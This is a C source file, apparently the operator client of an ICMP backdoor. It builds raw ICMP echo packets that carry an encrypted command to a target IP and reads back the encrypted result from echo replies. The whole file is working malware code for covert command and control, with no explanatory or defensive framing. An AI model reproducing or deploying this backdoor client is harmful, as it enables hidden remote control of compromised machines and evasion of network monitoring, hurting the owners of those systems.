#include "backdoor.h"

int main(int argc, char *argv[])
{
  if(getuid() != 0) { printf("You must be root!\n"); exit(1); }
  if(argc < 3) { printf("Usage: %s <dest-ip> <command>\n",argv[0]); exit(1); }

  send_request(argv[1], argv[2]);
  recv_response();

  return 0;
}

int send_request(char *dst_ip, char *cmd)
{
  int rawsock;
  int one = 1;
  struct sockaddr_in addr;
  unsigned int packetsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct bd_data);
  unsigned char packet[packetsize];
  struct iphdr *ip = (struct iphdr *)packet;
  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
  struct bd_data *data = (struct bd_data *)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
  char buf[BUFSIZE];

  memset(packet,0,packetsize);

  if( (rawsock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1 ) { perror("socket"); exit(1); }
  if( setsockopt(rawsock,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one)) == -1 ) { perror("setsockopt"); exit(1); }

  ip->version = 4;                
  ip->ihl = 5;                    
  ip->id = htonl(random());       
  ip->daddr = inet_addr(dst_ip); 
  ip->ttl = 123;                  
  ip->protocol = IPPROTO_ICMP;    
  ip->tot_len = packetsize;       
  ip->check = 0;                  

  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->checksum = 0;

  data->len = strlen(cmd);
  encrypt(cmd,buf,strlen(cmd),PASSWORD);	      
  strncpy(data->cmd,buf,BUFSIZE);

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = ip->saddr;

  if( (sendto(rawsock,packet,packetsize,0,(struct sockaddr*)&addr,sizeof(struct sockaddr_in))) == -1 )
    {
      perror("send");
      exit(1);
    }

  return 0;
}

int recv_response(void)
{
  int sock;
  unsigned int packetsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct bd_data);
  unsigned char packet[packetsize];
  struct iphdr *ip = (struct iphdr *)packet;
  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
  struct bd_data *data = (struct bd_data *)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
  char buf[BUFSIZE];

  if( (sock = socket(AF_INET, SOCK_RAW, 1)) < 0) { perror("socket"); exit(1); }

  while(1)
    {
      read(sock,packet,packetsize);

      if( (icmp->type == ICMP_ECHOREPLY) && (icmp->code == 0) )
	{	  	  
	  decrypt(data->cmd,buf,data->len,PASSWORD);
	  printf("Response: %s\n",buf);
	  break;
	}
    }

  return 0;
}
